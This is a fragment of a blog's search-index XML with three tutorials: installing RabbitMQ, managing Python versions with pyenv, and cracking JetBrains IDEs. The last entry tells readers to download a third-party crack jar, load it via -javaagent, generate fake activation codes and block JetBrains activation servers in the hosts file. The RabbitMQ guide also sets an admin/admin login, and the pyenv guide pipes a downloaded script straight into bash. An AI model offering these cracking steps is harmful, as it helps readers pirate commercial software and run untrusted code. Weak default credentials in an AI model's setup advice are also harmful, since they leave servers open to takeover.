16.04 xenial</li><li>ubuntu 18.04 boinc</li><li>ubuntu-arm 16.04 xenial</li></ul>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ Installation</title>
      <link href="/2018/12/09/003_RabbitMQ_Installation/"/>
      <url>/2018/12/09/003_RabbitMQ_Installation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>RabbitMQ is the most widely deployed open source message broker</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>OS: Ubuntu 16.04 LTS</p><h3 id="Step1-Install-erlang-package"><a href="#Step1-Install-erlang-package" class="headerlink" title="Step1: Install erlang package"></a>Step1: Install erlang package</h3><p><a href="https://packages.erlang-solutions.com/erlang/" target="_blank" rel="noopener">https://packages.erlang-solutions.com/erlang/</a></p><pre><code class="lang-bash">$ wget https://packages.erlang-solutions.com/erlang-solutions_1.0_all.deb$ sudo dpkg -i erlang-solutions_1.0_all.deb$ sudo apt update$ sudo apt install erlang</code></pre><h3 id="Step2-Add-apt-source"><a href="#Step2-Add-apt-source" class="headerlink" title="Step2: Add apt source"></a>Step2: Add apt source</h3><pre><code class="lang-bash">$ echo &quot;deb https://dl.bintray.com/rabbitmq/debian xenial main&quot; | sudo tee /etc/apt/sources.list.d/bintray.rabbitmq.list</code></pre><h1 id="Step3-Add-public-key-to-your-trusted-key-list"><a href="#Step3-Add-public-key-to-your-trusted-key-list" class="headerlink" title="$$ Step3: Add public key to your trusted key list"></a>$$ Step3: Add public key to your trusted key list</h1><pre><code class="lang-bash">$ wget -O- https://www.rabbitmq.com/rabbitmq-release-signing-key.asc | sudo apt-key add -$ sudo apt-get update</code></pre><h3 id="Step4-Install-rabbitmq-server-package"><a href="#Step4-Install-rabbitmq-server-package" class="headerlink" title="Step4: Install rabbitmq-server package:"></a>Step4: Install rabbitmq-server package:</h3><pre><code class="lang-bash">$ sudo apt-get install rabbitmq-server</code></pre><h3 id="Step6-Enable-web-management-amp-add-user"><a href="#Step6-Enable-web-management-amp-add-user" class="headerlink" title="Step6: Enable web management &amp; add user"></a>Step6: Enable web management &amp; add user</h3><pre><code class="lang-bash">$ sudo rabbitmq-plugins enable rabbitmq_management$ sudo rabbitmqctl add_user admin admin$ sudo rabbitmqctl set_user_tags admin administrator</code></pre><h2 id="Management"><a href="#Management" class="headerlink" title="Management"></a>Management</h2><p>Open <a href="http://yourip:15672" target="_blank" rel="noopener">http://yourip:15672</a></p><p>Username: admin<br>Password: admin</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to use pyenv to manage multiple python versions</title>
      <link href="/2018/12/04/002_How_to_use_pyenv_to_manage_multiple_python_versions/"/>
      <url>/2018/12/04/002_How_to_use_pyenv_to_manage_multiple_python_versions/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>pyenv lets you easily switch between multiple versions of Python. It’s simple, unobtrusive, and follows the UNIX tradition of single-purpose tools that do one thing well.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Way1-Manually"><a href="#Way1-Manually" class="headerlink" title="Way1: Manually"></a>Way1: Manually</h3><p>If you use bash as your shell, please change <code>.zshrc</code> to <code>.bashrc</code></p><pre><code class="lang-bash">$ git clone git://github.com/yyuu/pyenv.git ~/.pyenv$ echo &#39;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#39; &gt;&gt; ~/.zshrc$ echo &#39;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc$ echo &#39;eval &quot;$(pyenv init -)&quot;&#39; &gt;&gt; ~/.zshrc$ exec $SHELL -l</code></pre><h3 id="Way2-Install-by-scripts"><a href="#Way2-Install-by-scripts" class="headerlink" title="Way2: Install by scripts"></a>Way2: Install by scripts</h3><pre><code class="lang-bash">$ curl -L https://raw.githubusercontent.com/yyuu/pyenv-installer/master/bin/pyenv-installer | bash</code></pre><h2 id="Install-Python-by-pyenv"><a href="#Install-Python-by-pyenv" class="headerlink" title="Install Python by pyenv"></a>Install Python by pyenv</h2><h3 id="Step1-Install-build-tools-first"><a href="#Step1-Install-build-tools-first" class="headerlink" title="Step1: Install build tools first"></a>Step1: Install build tools first</h3><ul><li>For Ubuntu</li></ul><pre><code class="lang-bash">$ sudo apt install -y build-essential checkinstall libreadline-gplv2-dev \libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev \libbz2-dev zlib1g-dev openssl libffi-dev python3-dev python3-setuptools wget</code></pre><ul><li>For MaxOS</li></ul><pre><code class="lang-bash">$ brew install zlib$ export LDFLAGS=&quot;-L/usr/local/opt/zlib/lib&quot;$ export CPPFLAGS=&quot;-I/usr/local/opt/zlib/include&quot;</code></pre><h3 id="Step2-Find-available-versions"><a href="#Step2-Find-available-versions" class="headerlink" title="Step2: Find available versions"></a>Step2: Find available versions</h3><pre><code class="lang-bash">$ pyenv install -l</code></pre><h3 id="Step3-Choose-version-you-want-to-install"><a href="#Step3-Choose-version-you-want-to-install" class="headerlink" title="Step3: Choose version you want to install"></a>Step3: Choose version you want to install</h3><pre><code class="lang-bash"># exp. python-3.7.0$ CFLAGS=&quot;-I$(xcrun --show-sdk-path)/usr/include&quot; pyenv install 3.7.0</code></pre><h3 id="Step4-Switch-to-your-version"><a href="#Step4-Switch-to-your-version" class="headerlink" title="Step4: Switch to your version"></a>Step4: Switch to your version</h3><pre><code class="lang-bash">$ pyenv global 3.7.0$ pyenv rehash</code></pre><h2 id="Get-all-installed-version"><a href="#Get-all-installed-version" class="headerlink" title="Get all installed version"></a>Get all installed version</h2><pre><code class="lang-bash">$ pyenv versions# output:  system  2.7.10* 3.7.0 (set by /Users/Vincent/.pyenv/version)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cracking for Jetbrains series (2018.3.0 or higher)</title>
      <link href="/2018/11/20/001_Cracking_for_Jetbrains_series/"/>
      <url>/2018/11/20/001_Cracking_for_Jetbrains_series/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Self-host lisense server is no longer supported for ver. 2018.3.0 or higher. You can only use the cracker file.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Step1-Download-the-crack-file"><a href="#Step1-Download-the-crack-file" class="headerlink" title="Step1: Download the crack file"></a>Step1: Download the crack file</h3><ul><li><p>Way1: Download direct link: <a href="http://idea.lanyus.com/jar/JetbrainsCrack-2.10-release-enc.jar" target="_blank" rel="noopener">JetbrainsCrack-2.10-release-enc.jar</a></p></li><li><p>Way2: Download the latest version at <a href="http://idea.lanyus.com/" target="_blank" rel="noopener">here</a></p></li></ul><img src="/2018/11/20/001_Cracking_for_Jetbrains_series/idea.lanyus.com.png"><h3 id="Step2-Copy-crack-file-to-the-Application’s-bin-folder"><a href="#Step2-Copy-crack-file-to-the-Application’s-bin-folder" class="headerlink" title="Step2: Copy crack file to the Application’s bin folder"></a>Step2: Copy crack file to the Application’s bin folder</h3><p>For example (MacOS):</p><ul><li><p>Copy JetbrainsCrack-2.10-release-enc.jar to /Application/{JetBrains Application}/Contents/bin/. Then edit vmoptions file in the bin forlder.</p></li><li><p>Add the following at the end of the file.</p></li></ul><pre><code>-javaagent:JetbrainsCrack-2.10-release-enc.jar</code></pre><h3 id="Step3-Generate-Activation-code-at-the-following-web"><a href="#Step3-Generate-Activation-code-at-the-following-web" class="headerlink" title="Step3: Generate Activation code at the following web"></a>Step3: Generate Activation code at the following web</h3><p><a href="http://idea.lanyus.com/" target="_blank" rel="noopener">http://idea.lanyus.com</a></p><h3 id="Step4-Block-the-official-activation-web-address"><a href="#Step4-Block-the-official-activation-web-address" class="headerlink" title="Step4: Block the official activation web address"></a>Step4: Block the official activation web address</h3><p>Add the following line in your system’s host file</p><pre><code>127.0.0.1 account.jetbrains.com127.0.0.1 www.jetbrains.com</code></pre><h3 id="Step5-Activate-your-IDE"><a href="#Step5-Activate-your-IDE" class="headerlink" title="Step5: Activate your IDE"></a>Step5: Activate your IDE</h3><img src="/2018/11/20/001_Cracking_for_Jetbrains_series/activation.png">]]></content>
      
      
      <categories>
          
          <category> Solutions </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
